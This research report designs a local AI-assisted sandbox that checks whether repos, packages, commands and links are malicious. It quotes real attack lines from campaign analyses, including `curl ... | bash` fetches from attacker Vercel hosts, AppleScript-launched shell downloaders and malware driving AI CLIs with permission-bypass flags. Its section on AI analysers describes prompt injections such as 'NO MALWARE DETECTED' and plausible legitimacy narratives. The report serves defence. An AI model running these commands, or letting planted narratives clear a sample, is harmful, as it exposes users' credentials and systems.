# Designing a one-command "is this safe?" AI sandbox for macOS and Linux: research report (November 2026)

**The gap is real and worth building:** nothing on the market yet combines (a) one local command, (b) a plain-language question about any artifact, (c) an AI agent that takes the artifact apart *and* runs it inside a disposable microVM, and (d) a verdict a non-expert can act on. The nearest tools each cover only one or two of those four. The catch is that the tool's credibility depends on two engineering disciplines more than on the AI: hardware-virtualised containment, and an agent architecture that can never be talked into saying "safe".

## TL;DR

- **Build it, but scope the MVP to developer-targeted lures.** Fake-interview repos with VS Code `tasks.json` auto-run, malicious npm/PyPI packages, `curl | bash` installers and ClickFix-style "paste this command" lures are the fastest-growing, best-documented threats of 2025-2026, and no consumer-simple local tool covers them. Consumer text-scam checkers (Bitdefender Scamio, Norton Genie) already exist for pure messages. Cloud sandboxes (ANY.RUN, Joe Sandbox, Hybrid Analysis) are analyst tools whose free tiers are public.
- **Containment: a Rust host orchestrator driving a libkrun/KVM microVM on Linux and a Virtualization.framework Linux VM on Apple Silicon (signed with the `com.apple.security.virtualization` entitlement and notarised).** Default to no network, then a fake-internet mode. Live egress should be opt-in and recorded. Containers alone (Docker/Podman) are not an acceptable boundary, and "absolutely contained" should be presented honestly as "hardware-virtualised, disposable, offline by default".
- **The AI layer is a real attack surface.** Malware already carries prompt injections aimed at AI analysers ("Skynet", June 2025; FRUITSHELL), and research ("ALIBI", 2026) shows that *plausible narratives* beat crude "ignore previous instructions" text. The design must put deterministic evidence first, let the LLM only raise risk (never lower it), and never print a green "safe" verdict, only "no red flags found in what we could check", plus an explicit list of what wasn't checked.

## Key Findings

1. **The threat is concrete and dev-heavy.** DPRK's Contagious Interview campaign ships "coding assessment" repos where simply opening the folder in VS Code (and clicking Trust) runs a hidden task (`runOn: folderOpen`, `reveal: never`) that runs `curl … | bash`. Since April 2025, OpenSourceMalware has catalogued numbered variants up to "Variant eighteen" (report published 29 November 2025), each with "a Vercel URL that's custom for each variant".
2. **Payloads actively evade sandboxes and tell victims to drop theirs.** OtterCookie v4 (since April 2025) includes VM-detection code. NTT Security found it can detect VMware, VirtualBox, Microsoft and QEMU virtual-machine environments, and Microsoft's hunting query adds Parallels. The campaign has also told victims to disable Docker and run code directly on the host.
3. **Supply-chain malware now targets AI tooling.** s1ngularity (Nx, 26 August 2025) drove locally installed Claude, Gemini and Amazon Q CLIs with `--dangerously-skip-permissions`/`--yolo`/`--trust-all-tools` to hunt for secrets, harvesting 2,349 credentials from 1,079 machines. Shai-Hulud (September 2025), which CISA said "has compromised over 500 packages", and Shai-Hulud 2.0 (November 2025) self-replicated across npm using TruffleHog.
4. **LLMs are good at reading malicious code, but published numbers overstate field performance.** GPT-4 reached 0.99 precision / 0.97 F1 on a 5,115-package npm benchmark (SocketAI, ICSE 2025). By contrast, Microsoft's Project Ire fell from 0.98 precision / 0.83 recall on a curated driver set to 0.89 precision / 0.26 recall on a harder real-world test. Low recall is exactly the "false reassurance" failure mode this tool must not show users.
5. **The best Rust-native containment building block today is libkrun (via microsandbox or directly).** It runs on KVM on Linux and Hypervisor.framework on macOS, and its project claims sub-100 ms boots. The trade-off: a 2026 comparative study rates it the riskiest posture in the residual-bug sense (no CVE history, no upstream fuzzing, no engine-side seccomp) and says every hardening layer has to be added by the integrator.
6. **Nearest competitors are partial.** vetsh (LLM review of shell scripts, no execution), vet (diff + shellcheck + approval, no AI), m4vic/detonate (local one-command detonation with credential decoys but explicitly "no LLM"), allsmog/detonate (LLM + sandbox, but a multi-service SOC platform), GhidraMCP/ida-pro-mcp (static expert RE), Aikido safe-chain (reputation-based package blocking), and Scamio/Genie (text and URL scam chat).

## Details

### 1. Threat landscape (2024-2026): what victims actually receive

**Fake recruiter / fake interview (Contagious Interview, DPRK, a.k.a. Famous Chollima).**
- **Delivery.** A recruiter or "CTO" on LinkedIn, Upwork or Telegram sends a Notion page with a "technical assessment" and a GitHub, GitLab or Bitbucket link. One documented case (Security Alliance radar) involved a Bitbucket repo where the victim *only cloned and opened it*. A hidden task named `eslint-check` with `runOn: folderOpen` executed JavaScript disguised as a font file (`public/font/fa-brands-regular.woff2`) and wrote a persistence loader under `~/.npm/`.
- **A first-hand account (ashishb.net)** found four separate vectors in one repo:
  - a whitespace-padded `tasks.json` running `curl -L https://vscode-settings-0506.vercel.app/api/settings/mac | bash` on macOS (with `wget | sh` and `curl | cmd` variants for Linux and Windows);
  - about 10 rotated burner Vercel hosts in git history;
  - a server route that pipes an HTTP response into `new Function("require", response.data)`;
  - an npm `prepare` lifecycle hook.
- **Variant tracking.** OpenSourceMalware (29 November 2025) tracked numbered variants of the tasks.json technique from 22 April 2025 to 11 November 2025. Jamf, Abstract Security and Microsoft (11 March 2026) document the same pattern. Microsoft notes that an October 2025 OtterCookie variant added heavy obfuscation.
- **Payload chain.** BeaverTail (JS infostealer/downloader) leads to InvisibleFerret (Python backdoor) and/or OtterCookie (Node.js). They steal browser credentials, wallet extensions (OtterCookie targets 27 per one researcher's analysis), files and clipboard data, with keylogging and AnyDesk-style remote access.
- **Evasion that matters to this tool:**
  - Talos: OtterCookie v4 "includes a virtual environment detection code to help attackers discern logs from sandbox environments from those of actual infections".
  - Microsoft's hunting query keys on `qemu`, `virtual`, `parallels`, `virtualbox`, `vmware` alongside a `makelog` logging channel.
  - MITRE-mapped profiles note C2 geolocation/header checks and victims being told to disable Docker.
  - **Design implication:** a detonation sandbox that phones home will *tell the operator it is a sandbox*, and a naive QEMU guest will be fingerprinted.

**ClickFix / paste-this-command.**
- **The basic lure.** A fake CAPTCHA, "verified publisher" download page or "fix" page copies a one-liner. On macOS it is `curl … | bash` or `zsh`, which drops Atomic macOS Stealer (AMOS) or MacSync. Scripts loop on a fake password prompt and verify the password via `dscl` before stealing Keychain, browser and wallet data.
- **Unit 42's variant** downloads a DMG to `/tmp`, mounts it with `hdiutil attach -nobrowse`, searches for an `.app`/`.pkg` and launches it.
- **Microsoft Threat Intelligence** documented server-side fingerprinting that shows *benign decoy pages to scanners and non-Mac visitors*. **Implication:** URL analysis must present a realistic macOS Safari/Chrome fingerprint, or it will see the decoy.
- **The 2026 Script Editor bypass.** After Apple added Terminal paste warnings (macOS 26.4), attackers moved to `applescript://` deep links that open Script Editor pre-filled with `do shell script "curl -kSsfL <obfuscated> | zsh"` (Malwarebytes, April 2026). Malwarebytes repeats a claim that ClickFix accounted for more than half of 2025 loader activity, but this is secondhand and should be treated as indicative.

**Malicious packages and worms.**
- **s1ngularity (Nx, 26 August 2025).** A postinstall stealer exfiltrated to public `s1ngularity-repository` repos in the victim's own GitHub account. It was the first documented malware to drive local AI coding CLIs as reconnaissance tools.
- **Shai-Hulud (from 14-16 September 2025).**
  - It ran `trufflehog filesystem /`, pushed secrets to a public "Shai-Hulud" repo, injected a GitHub Actions workflow and republished itself across a maintainer's packages.
  - CISA issued an alert on 23 September 2025. It said the worm "has compromised over 500 packages" and advised users to "Pin npm package dependency versions to known safe releases produced prior to Sept. 16, 2025", to "Immediately rotate all developer credentials" and to "Block outbound connections to webhook.site domains".
  - **Shai-Hulud 2.0 (24 November 2025)** switched to `preinstall` and compromised 796 packages with more than 20 million weekly downloads (Datadog, per a 2026 arXiv survey). It carried a fallback that shreds writable files in the user's home directory.
- **Import-time triggers.** In the July 2026 jscrambler compromise, later malicious versions executed on *import*, so `npm install --ignore-scripts` offered no protection. Detonation must exercise entry points (import, CLI, `npm start`), not just install.

**Attacks on AI agents and analysers.** s1ngularity (above) abused AI CLIs. VirusTotal Code Insight (February 2026) analysed 3,016 OpenClaw agent "skills" and found hundreds malicious. That included 314 skills from a single publisher, "hightower6eu", all identified as malicious and all instructing users to download and run external code during "setup" (on macOS, a Base64-obfuscated script that downloads AMOS). Malware that tries to manipulate the analyser itself is covered in §5.

**What the tool must catch (derived checklist):**
- auto-run hooks: `.vscode/tasks.json` `folderOpen`, `.cursor/tasks.json`, npm `pre/post/install`/`prepare`, Python `setup.py`/build backends, `build.rs`, Makefiles, git hooks;
- remote-code patterns: `curl|sh`, `new Function`/`eval` of network data, base64/XOR blobs, code hidden in non-code files (fonts, SVG);
- access to credential stores: browser profiles, wallet extensions, `~/.ssh`, `~/.aws`, `.npmrc`, `gh` tokens, Keychain, AI CLI configs;
- invocation of AI CLIs with permission-bypass flags;
- password-prompt phishing via `osascript`/`dscl`;
- persistence: LaunchAgents, systemd user units, shell rc files, GitHub workflow injection;
- environment checks for VMs.

### 2. Existing tools and prior art: where the gap is

| Tool | What it does | Gap vs. this concept |
|---|---|---|
| VirusTotal (+ Code Insight, Gemini) | Multi-AV, sandboxes, LLM summaries of scripts, packages (npm, wheel), extensions (CRX/XPI/VSIX), MCP servers, Mach-O | Cloud; uploads are shared with the community unless you pay for Private Scanning; analyst-oriented |
| ANY.RUN | Interactive cloud sandbox; free Community tier = "20% of sandbox functionality", 60 s VM timeout, 16 MB files; macOS Sequoia ARM only in Enterprise | Free analyses are public; private needs Hunter/Enterprise (unpublished pricing) |
| Joe Sandbox (Joe Sandbox AI) | AI summaries, "Adaptive Detonation" in which AI agents spot evasions and re-steer detonation; MCP server accepts files, URLs, command lines | Cloud/enterprise; expert reports |
| Hybrid Analysis (CrowdStrike) | Free Falcon Sandbox; now defaults to ML "QuickScan Pro" verdicts; MCP server and Python CLI | Public submissions; private needs a Falcon contract |
| Cuckoo/CAPE | Self-hosted detonation (CAPE now feeds payload extraction into VirusTotal) | Heavy ops; Windows-centric; no NL interface |
| urlscan.io | URL rendering, screenshots, DOM | URL-only; public by default on free tier; cloakable |
| Socket, Phylum, Snyk, OSV-Scanner, GuardDog, packj | Registry-scale package malware/reputation/static rules | Pre-install reputation, not "detonate this unknown thing"; GuardDog scored 94.38% accuracy on npm in one 2026 benchmark |
| OpenSSF package-analysis | gVisor-in-Podman detonation of packages in install/import/execute phases, strace + pcap | Infrastructure for registries, not end users; gVisor implements only the most common syscalls, and the authors cite 211 |
| Aikido safe-chain | Local proxy wrapping npm/yarn/pnpm/bun/pip/uv/poetry; blocks known-malware packages from Aikido Intel; optional 24 h minimum package age | Reputation only; no unknown-sample analysis |
| Dangerzone | Converts documents to pixels inside gVisor inside Podman with `--network=none`, rebuilds a clean PDF on the host (gVisor since 0.7.0) | Sanitises documents; does not judge them |
| Qubes disposables / Windows Sandbox | Throwaway VMs | Manual; no analysis or verdict |
| Bitdefender Scamio / Norton Genie | Free AI chat scam checkers for text, links and screenshots | Text and reputation only; no detonation; Scamio needs an account; in a KSL TV test only Genie flagged one scam message the others passed |
| vetsh | "AI-powered security review for shell scripts. A safer alternative to curl \| bash"; `--shield` mode; AST sanitisation against prompt injection | Bash only, 1 MB cap, no execution |
| vet (vet-run) | Safety net for `curl \| bash`: diff vs last run, shellcheck, explicit approval | No AI, no sandbox |
| m4vic/detonate | One-command local detonation with network off, read-only root, dropped caps, credential decoys, SARIF | "No LLM is involved in any verdict"; AI-tool/MCP focus |
| allsmog/detonate | Docker/QEMU sandbox + YARA/Suricata + Ollama/Claude summaries | Multi-service SOC platform (Postgres, Redis, MinIO) |
| GhidraMCP, ida-pro-mcp, Binary Ninja MCP, r2mcp | LLM-driven static reverse engineering | Expert tooling; IDA requires a paid licence; no execution, no verdict UX |
| Microsoft Project Ire | Autonomous binary classifier shipping inside Defender as "Binary Analyzer" | Not available as a standalone tool; Windows-focused |

**Gap statement.** The unoccupied intersection is *local + private + one command + any artifact type + agentic static-plus-dynamic analysis + non-expert verdict*. The strongest adjacent competitor for the developer wedge is likely VirusTotal Code Insight, whose analysis is now strong on npm, VSIX and Mach-O, but it is a cloud upload whose default visibility is a problem for private repos and recruiter material. For the consumer-text wedge it is Scamio and Genie, which are free and distribution-advantaged. That argues against leading with text-only scams.

### 3. Isolation technology options

**What "absolutely contained" can honestly mean.** It cannot mean "impossible to escape". It can mean:
1. hardware virtualisation with a separate guest kernel;
2. no host filesystem shares (artifacts copied in, evidence streamed out over a narrow vsock/virtio-serial protocol);
3. no network by default;
4. a disposable copy-on-write image destroyed after each run;
5. a hardened VMM process (seccomp, unprivileged user, Landlock) as a second wall.

Hypervisor escapes do happen (QEMU device-emulation bugs, and VMware/VirtualBox escapes at Pwn2Own), but they are rare and costly, and are unlikely to be spent on a recruiter-lure victim. The realistic residual risks are VMM device bugs, data leaking out via shared folders or the clipboard, and the user running the thing on the host anyway.

**Linux options**

| Option | Boundary | Startup | Zero-config? | Observability | Verdict for this tool |
|---|---|---|---|---|---|
| Firecracker | KVM microVM, minimal devices, jailer | ≤125 ms from the InstanceStart API call to guest `/sbin/init`, per Firecracker's SPECIFICATION.md (1 vCPU, 128 MiB minimal guest) | Needs `/dev/kvm`, kernel+rootfs; Linux-only | Guest-side tooling | Excellent boundary; Linux-only and x86/ARM server-oriented; good fallback backend |
| Cloud Hypervisor / crosvm | KVM, Rust VMMs | Fast | Similar to Firecracker | Guest-side | Solid alternatives; more devices than needed |
| QEMU microvm | KVM | Fast-ish | Ubiquitous | Guest-side | Largest attack surface; most fingerprintable by malware |
| libkrun / krunvm / microsandbox | KVM (Linux), HVF (macOS); library VMM | microsandbox claims <100 ms | Embeddable, no daemon; on Linux, libkrun's device layer links against libcap-ng | Guest agent; microsandbox ships a smoltcp user-space network stack with DNS/TLS interception | **Recommended**: same API on both OSes, Rust-native; add your own seccomp/Landlock to the VMM |
| Kata Containers | VM per container | Seconds | Heavy (containerd) | — | Overkill for a CLI |
| gVisor | User-space kernel (syscall interception) | Fast | Easy | strace-like | Stronger than containers, used by Dangerzone and OpenSSF; but syscall gaps make malware fail or reveal the sandbox; good *inside* a VM |
| bubblewrap / nsjail / Landlock / seccomp / user namespaces | Same kernel, policy-restricted | Instant | Easy | strace/eBPF | Use to harden the VMM and the static-analysis workers, **not** as the detonation boundary |
| Docker/Podman, systemd-nspawn | Shared kernel | Instant | Docker not universal | Good | Insufficient alone: one kernel bug and the payload is on the host; also, the campaign tells victims to turn Docker off |

**macOS options**
- **Virtualization.framework (VZ).** First-party, runs Linux and macOS guests on Apple Silicon, with NAT networking, vsock, virtio-fs, Rosetta for Linux and snapshots (save/restore on recent macOS). A process must hold `com.apple.security.virtualization`. Ad-hoc signing works on the build machine, but an Apple forum thread shows a CLI failing with "The process doesn't have the … entitlement" on another Mac until it was properly signed with a developer account. Plan on Developer ID signing and notarisation. Bridged networking needs an extra Apple-granted entitlement (not needed here). Rust bindings exist (`virtualization` by synchronal, `virt-fwk`, plus the `objc2-virtualization` family). Security researchers note that EDRs are starting to flag *ad-hoc-signed* binaries with this entitlement as an offensive technique, which is another reason to ship properly signed builds.
- **Apple `container` / Containerization (macOS 26).** Apple's open-source Swift tool runs one lightweight VM per OCI container, with sub-second boot claims. Version 1.0 shipped in June 2026 and needs macOS 26 on Apple Silicon. It is a strong optional backend and validates the VM-per-sandbox model, but it is Swift with a daemon, so embedding it from Rust means shelling out.
- **Lima/Colima, Tart, UTM, vfkit, OrbStack.** All wrap VZ/HVF. Tart is a good reference for macOS-guest automation; OrbStack is closed-source and runs a shared VM. None should be a hard dependency.
- **libkrun on macOS (HVF).** Same API as on Linux, used by Podman's krunkit and by microsandbox.
- **sandbox-exec/Seatbelt.** Deprecated in its man page but still used by Apple and by tools such as Codex and Claude Code for agent sandboxing. Fine for constraining the *host-side* static workers, never for detonation.
- **Endpoint Security framework.** For monitoring inside a *macOS guest*. It needs an Apple-granted entitlement, which is a distribution hurdle; for the MVP, instrument with `eslogger`/`fs_usage`/unified logs inside the guest instead.

**macOS-specific malware (DMG/PKG/AppleScript/AMOS) when the guest is Linux.**
- **Phase 1 (Linux guest, static).** Unpack DMG (`7z`, `dmg2img`), PKG (`xar` + `cpio`), parse Mach-O (`goblin` crate, `lief`), extract strings and entitlements and code-signature state, and read shell/AppleScript *source*. Compiled `.scpt` decompilation realistically needs macOS (`osadecompile`).
- **Phase 2 (macOS guest via VZ, opt-in).** Apple's licence (§2B(iii)) allows "up to two (2) additional copies or instances" of macOS in VMs on a Mac you own for development, testing or "personal, non-commercial use". That covers the end user running their own analysis VM but restricts commercial hosted offerings. The macOS restore image (IPSW) is a large first-time download, so make it an explicit "deep macOS check" install step. Also plan to spoof or minimise VM tells (hardware model strings, `sysctl`/`ioreg` values) because AMOS-family stealers and OtterCookie check for VMs.

**Rust-friendly embedding**
- `microsandbox` crate (libkrun, OCI images, Rust SDK, MCP server, Apache-2.0).
- Direct `libkrun` C API via bindgen.
- `virtualization`/`virt-fwk`/`objc2-virtualization` on macOS.
- Firecracker over its REST API.
- `cloud-hypervisor`/`rust-vmm` crates.
- **Hyperlight** (Microsoft): micro-VMs for running *functions*, not full Linux userlands. Not suitable for detonating arbitrary installers.
- **Wasmtime/WASI**: good for running your own untrusted parsers (e.g. a YARA engine or document parser compiled to WASM) on the host side, not for detonation.

**Remote/cloud sandboxes (E2B, Modal, Daytona, Fly Machines, Cloudflare Sandboxes, Morph).** E2B uses Firecracker. These buy instant cold starts, zero local prerequisites (no KVM, no entitlement), Windows guests, and keep detonation traffic off the user's IP. They cost money per run, send the user's private recruiter material and repos to a third party, and make you the operator of a service that downloads malware, which creates abuse, legal and provider-terms exposure. **Recommendation:** local-first, with an optional "cloud deep scan" later for Windows payloads and for users without virtualisation.

**Network isolation strategy (tiered)**
1. **Offline (default).** The VM has no NIC. Many stagers will fail, but the failure itself is evidence (e.g. "tried to reach `vscode-settings-0506.vercel.app` and pipe the result into bash").
2. **Fake internet.** A host-side user-space stack (microsandbox's smoltcp layer is a model) answers DNS with a sinkhole and serves INetSim/FakeNet-NG-style canned HTTP(S) with a locally generated CA trusted in the guest. Every request is recorded (URL, method, headers, body).
3. **Live, recorded egress (explicit opt-in, per run).** Route through a host-side mitmproxy-style recorder with an allowlist of public package and code hosts, rate limits, SMTP/SMB/RDP blocked, and a hard timeout. Warn that live detonation can tip off the operator (OtterCookie explicitly logs sandbox runs) and that traffic leaves from the user's IP. A wiser default for second stages is to *fetch* the next-stage URL from a separate network-less fetcher and analyse it statically, rather than letting the payload run with live C2.

### 4. Behaviour observation inside the sandbox

- **Process and syscall tracing.** Inside a Linux guest you control the kernel, so ship a guest kernel with BTF and run an eBPF tracer:
  - Tetragon or Tracee for exec/file/network events with process ancestry;
  - Falco if you want rules;
  - `strace -f` as a fallback (OpenSSF package-analysis parses strace logs);
  - auditd is heavier and adds little;
  - fanotify gives cheap whole-filesystem access events.
  Because the tracer is in the guest, a root-level payload could tamper with it. Treat telemetry as best-effort and complement it with *outside-the-guest* evidence.
- **Outside-the-guest evidence (tamper-proof).**
  - Disk diff: compare the copy-on-write overlay against the base image after the run.
  - Network log from the host-side stack.
  - Wall-clock behaviour: timeouts and sleeps.
  - Screenshots from a virtual framebuffer for GUI/browser runs.
- **Honeytokens and canaries.** These are the highest-value signal for stealers, which dominate the threat set. Pre-seed a realistic fake home directory:
  - `~/.ssh/id_ed25519`, `~/.aws/credentials`, `~/.npmrc` with a fake token, `.env` files, a `gh` hosts file;
  - a Chrome/Brave profile with `Login Data`/`Cookies` and a MetaMask/Phantom extension directory with a fake vault;
  - an Exodus/Electrum wallet folder, a Keychain-like file;
  - *fake `claude`/`gemini`/`q` CLI binaries that log their arguments* (directly catches s1ngularity-style abuse).
  Any read of these is strong evidence, and any canary *value* appearing in outbound traffic is near-conclusive. m4vic/detonate's "credential decoys planted in the sandbox home" validates this approach.
- **Realism versus fingerprinting.** Seed believable usernames, shell history, git config, installed VS Code, recent files, and uptime. A 2026 arXiv measurement study specifically examines "AI-environment realism gaps" in malware sandboxes; malware that checks for AI CLIs will treat an empty home directory as a sandbox.
- **Simulating the lure's intended trigger.** For repos, *simulate opening in VS Code*: parse `.vscode/tasks.json` and `.cursor/` tasks, execute `folderOpen` tasks in the VM, then run `npm install`, `npm start`/`npm test`, and import entry points. For ClickFix commands, run the exact pasted line. For DMGs, mount and launch as Unit 42 observed.
- **Turning telemetry into LLM-ready evidence.** Have a deterministic Rust "evidence compiler" reduce raw events to a small, typed list such as:
  - `{kind: "secret_read", path: "~/.ssh/id_ed25519", proc: "node /tmp/x.js", parent_chain: [...], t: 2.3s}`
  - `{kind: "net_attempt", host: "...vercel.app", via: "curl", piped_to: "bash"}`
  - `{kind: "persistence", file: "~/Library/LaunchAgents/..."}`
  - `{kind: "vm_check", indicator: "reads /proc/cpuinfo + 'hypervisor' grep"}`
  Each item gets a stable ID, so the final report can cite "E3, E7" and every sentence the user sees is traceable to an observation. Feed raw strings and code to the model only in bounded, clearly delimited excerpts.

### 5. AI agent design and its own security

**Documented attacks on AI analysers.**
- **Skynet (Check Point, June 2025).** Embedded text asking the model to declare "NO MALWARE DETECTED"; OpenAI o3 and GPT-4.1 both resisted it. MITRE ATLAS now tracks this as case study AML.CS0043.
- **FRUITSHELL (Google GTIG report).** Contains hard-coded prompts meant to mislead LLM-based analysis.
- **PROMPTSTEAL/LAMEHUG (APT28).** Fetches its commands from a hosted LLM at runtime, so static analysis sees only a prompt.
- **ALIBI (arXiv, 2026).** The most important finding for this design. Instead of imperative overrides, the payload supplies a *coherent legitimacy narrative* (e.g., "this is a security component; these APIs are for telemetry"). The model follows its system prompt and produces well-structured reasoning but reaches the wrong conclusion. Crude-injection filters will not stop this; only evidence-grounded, behaviour-first verdicts will.

**Architecture (recommended)**
1. **Trusted host-side planner** (privileged LLM, in the spirit of Willison's Dual-LLM pattern and DeepMind's CaMeL). It sees the user's question and *structured* evidence. It chooses from a fixed, typed tool set: `unpack`, `static_scan`, `detonate(mode)`, `fetch_url(isolated)`, `render_url`, `lookup_domain`, `yara`, `decompile`. Tools are executed by the Rust orchestrator, never by a shell the model writes on the host.
2. **Quarantined reader** (a separate LLM call with *no tools*). It reads raw untrusted text (README, code, page HTML, recruiter message) and returns only schema-constrained outputs, e.g. `{claims_to_be: str, asks_user_to_run: [cmd], urls: [..], urgency_cues: [..]}`. CaMeL's authors show that the Dual-LLM split protects control flow but data flow can still be manipulated. So nothing the quarantined model extracts may *lower* a risk score; it can only add things to investigate.
3. **Deterministic floor.** Rules over the evidence (canary touched, `curl|bash` from a non-vendor host, folderOpen task, AI CLI with bypass flags, persistence write, VM-check) set a minimum risk level that the LLM cannot override downward. The LLM's role is explanation, prioritisation and catching novel patterns, not acquittal.
4. **Secrets never enter the sandbox.** API keys live in the host process or OS keychain. The guest has no route to the LLM provider. microsandbox's "secrets that can't leak" design and abox's credential proxy are examples of the pattern.
5. **Validator pass.** As Project Ire does, a final checker rejects any report sentence not backed by an evidence ID and enforces "stop at the evidence boundary rather than overclaim".

**Verdict design for non-experts.** Use four states, never a green tick:
- 🔴 **Dangerous**: "Don't run it. Here's what it tried to do."
- 🟠 **Suspicious**: "Strong warning signs."
- 🟡 **Couldn't tell**: "It needed internet / a Mac / Windows to reveal itself."
- ⚪ **No red flags found in what we checked**: always followed by "what we did NOT check" (e.g., "the second-stage download was blocked; we never saw the final program").

Calibrate wording to evidence strength, not model confidence scores. LLM self-reported confidence is not reliable calibration.

**How good are LLMs at this? (dated evidence)**
- **SocketAI (ICSE 2025).** GPT-4 achieved 0.99 precision / 0.97 F1 on 5,115 npm packages (2,180 malicious), against 0.75 precision for 39 CodeQL rules.
- **Wyss et al. (RAID, October 2025).** GPT-4o flagged 46/46 known malicious npm updates and 163/163 malicious clones, with 8 false positives out of 2,000 typical updates. Whole-package analysis averaged $5.46 in tokens on GPT-4-Turbo, and 16.86% of packages exceeded the context window, which is why they analyse "smart diffs". A follow-up reports that GPT-4.1's performance drops by about 41% when asked to name *specific* malicious indicators rather than give a binary verdict.
- **Cross-benchmark variance.** In a 2026 benchmark, SocketAI's approach scored only 84.13% accuracy on PyPI, while the rule-based GuardDog hit 94.38% on npm.
- **Microsoft Project Ire (August 2025).** 0.98 precision / 0.83 recall on Windows drivers, but 0.89 precision / 0.26 recall in a harder real-world test.
- **VirusTotal Code Insight.**
  - On 9,981 never-before-seen Mach-O binaries (18 October 2025), it flagged 164 as malicious, including nearly 100 that AV engines missed.
  - Its MCP audit (June 2025) flagged 1,408 of 17,845 repos, but VirusTotal noted it over-flagged hello-world demos and "seems to trust human developers too much".
- **MalwareScope (student project).** A Random Forest classifier beat a zero-shot LLM 82% to 36% on Windows PE files, a reminder that LLM-only verdicts on binaries are weak.
- **Consumer scam checkers.** In KSL TV's 2026 test, only Norton Genie flagged a crafted scam message; the other apps passed it.

**Takeaway.** LLMs are strong on *readable* code (scripts, JS/Python packages, configs) and on explaining behaviour. They are weak on recall against evasive or binary samples. Dynamic evidence and rules must carry the verdict.

**Hosted vs local models.**
- **Hosted (default).** Frontier models are the most capable and, per Check Point's test, the most injection-resistant. VirusTotal runs Gemini Flash for this exact task at scale. Use bring-your-own-key for Anthropic, OpenAI and Gemini.
- **Local (privacy mode).** Run via Ollama/llama.cpp, accepting weaker reasoning. Keep the deterministic floor identical so verdicts degrade gracefully.
- **Policy friction.** I did not verify current provider usage-policy text for this report. Defensive malware *analysis* is broadly practised on hosted models (VirusTotal on Gemini, Check Point on OpenAI). Safety filters occasionally refuse to reproduce or explain exploit code, so design prompts around classification and explanation, and treat a refusal as "couldn't tell", never as "safe".

### 6. UX and distribution

- **Install.** Ship a single static Rust binary per OS/arch via Homebrew tap, `cargo binstall`, GitHub Releases with checksums and Sigstore signatures, and a Nix flake. Also offer a `curl | sh` installer; the irony is unavoidable, so make it short, signed and diffable, and teach `vet`-style review. On macOS, sign with Developer ID plus the virtualization entitlement and notarise; Homebrew casks or a pkg avoid Gatekeeper friction.
- **Prerequisites.**
  - Linux: check `/dev/kvm` and group membership with a `doctor` command that prints the exact fix (`sudo usermod -aG kvm $USER`). Fall back to "static-only mode" with a clear 🟡 when KVM is absent (e.g., nested in a cloud VM without nested virt).
  - macOS: Apple Silicon only for the VZ backend; Intel Macs get static-only plus optional cloud.
- **Images.** Lazily download a minimal guest (kernel plus an Alpine/Debian rootfs with node, python, git, curl, tracing tools), verified by digest, and cache it. Snapshot a booted, pre-warmed VM so later runs restore rather than boot. Product targets (not measurements): under 2 s to a running sandbox when warm, under 60 s end-to-end for a typical script or repo, a progress narration line every few seconds.
- **Input ergonomics.**
  - `issafe "recruiter sent me this, ok?" ./take-home-repo`
  - `issafe https://…`
  - `pbpaste | issafe`
  - `issafe -- 'curl -fsSL https://x | bash'`
  - `issafe npm:left-pad@1.3.0`
  - drag a file onto the terminal (the path arrives as an argument).
  An auto-classifier picks the pipeline from the input.
- **Shell integration (high leverage for ClickFix).** An opt-in zsh/bash hook (preexec / `bind -x`, or a paste-bracketing hook) that intercepts pasted multi-command or `curl|sh`-shaped input and asks "Check this first?" This directly targets the behaviour Apple added warnings for in macOS 26.4 and that attackers then routed around with Script Editor. A `git clone` wrapper can offer "open safely?" before VS Code sees a `folderOpen` task.
- **Output.** A traffic-light headline, then 3-6 plain-language evidence bullets ("It tried to read your SSH keys and crypto-wallet files"), then "What to do now" (don't run it; if you already did, rotate these credentials, revoke npm/GitHub tokens, check for `s1ngularity-`/`Shai-Hulud` repos, remove LaunchAgents), then "What we couldn't check", then `--json` and a full HTML evidence report.
- **Non-CLI wrappers (phase 3).**
  - A macOS menu-bar app plus a Share-sheet/Services action ("Check with issafe") over the same engine.
  - A browser extension that sends the *URL or copied command* to the local daemon via native messaging (useful for ClickFix pages, since the extension sees the clipboard write).
  - A messaging-app forwarder is where Scamio and Genie already are; don't compete there first.

### 7. Text-only inputs (e.g., a recruiter message with no attachment)

Possible and useful, but evidence-limited:
- **Social-engineering pattern detection.** Look for unsolicited high pay; crypto/DeFi/Web3 "startup"; a test that must be run locally (not on a hosted platform); urgency; requests to use your own machine, disable antivirus or Docker, or open in VS Code; moves to Telegram/Discord; Bitbucket/GitLab/Vercel links; video "camera fix" commands (the ClickFix-style "ContagiousInterview video driver" lure). Score these explicitly and show which cues fired.
- **Link expansion and isolated browsing.** Resolve redirects in a separate network-enabled browser VM (headless Chromium) with no user data, a realistic Mac fingerprint (to defeat decoy cloaking), screenshots, a DOM/JS capture, and clipboard-write capture (the ClickFix tell).
- **Infrastructure intel.** Domain age via RDAP/WHOIS, certificate-transparency first-seen (crt.sh), hosting (free Vercel/Netlify subdomains), a reputation lookup (Safe Browsing, urlscan search, VirusTotal *lookup by hash/URL without upload*), and known-IOC feeds for the campaign.
- **Company legitimacy.** Check website age against claimed founding date, LinkedIn page age and employee count consistency, GitHub org age and commit-author email patterns (the OpenSourceMalware/Abstract Security hunts pivot on these), and whether the "repo" is a trojanised clone of a public template (Elastic's GoCart case).
- **Honest output.** "This matches the fake-interview pattern (5 of 7 cues). We can't prove it's malicious without the repo; if they send one, run `issafe <repo>` before opening it."

### 8. Legal, ethical and practical risks

- **Running malware on the user's machine.** The user supplies the sample and runs it in a VM on their own hardware. Make detonation explicit ("will run inside an isolated VM"), keep artifacts out of host paths that Spotlight, AV or iCloud sync, and delete them by default. Host AV may quarantine extracted samples; document an exclusion for the cache directory.
- **Wrong verdicts and liability.** The biggest risk is a ⚪ result followed by an infection. Mitigate by never saying "safe", always listing unchecked areas, keeping a deterministic floor, adding an open-source licence with warranty disclaimers, and recording analysis provenance (versions, model, rules). Microsoft's Project Ire recall figures are the evidence to cite internally when someone wants a green tick.
- **Attack traffic and C2 contact.** Live mode can contact C2, tip off operators, trigger self-propagation (Shai-Hulud republishes with any npm token it finds, so *never* put a real token in the guest), or send spam. Keep live mode opt-in, egress-filtered and rate-limited, and block publish APIs (npm, PyPI, GitHub write endpoints) even in live mode.
- **Illegal content.** Documents or URLs may lead to CSAM or other illegal material. Don't persist rendered content beyond the session, don't upload to third parties by default, and don't build any cloud store of user submissions without a legal process.
- **Privacy.** Recruiter messages and private repos contain PII and IP. Local-first by default, with an explicit indicator whenever anything leaves the machine (LLM provider, reputation lookups). Never upload samples to VirusTotal by default (hash lookups only). Offer `--offline` with a local model.
